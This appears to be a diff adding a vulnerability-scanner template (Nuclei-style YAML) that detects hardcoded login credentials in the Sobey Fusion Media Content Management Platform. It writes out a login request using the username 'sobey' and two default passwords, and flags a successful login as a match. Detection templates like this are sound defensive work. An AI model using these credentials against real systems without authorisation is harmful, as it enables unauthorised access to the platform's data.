@@ -1,0 +1,37 @@
+id: poc-yaml-sobey-imcmp-hard-coded
+info:
+  name: Sobey Fusion Media Content Management Platform Hardcoded Credential Vulnerability
+  author: ProjectDiscoveryAI
+  severity: medium
+  tags: hardcoded-credentials
+  description: |
+    Detects hardcoded credentials in Sobey Fusion Media Content Management Platform.
+
+variables:
+  passwd:
+    - sobey
+    - Sobeyhive-2016
+
+http:
+  - raw:
+      - |
+        POST /user/login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json;charset=UTF-8
+
+        {"loginName":"sobey","password":"{{passwd}}","version":"V2"}
+    payloads:
+      passwd:
+        - sobey
+        - Sobeyhive-2016
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - '"success":true'
+          - '"requestId":'
+          - '"data":'
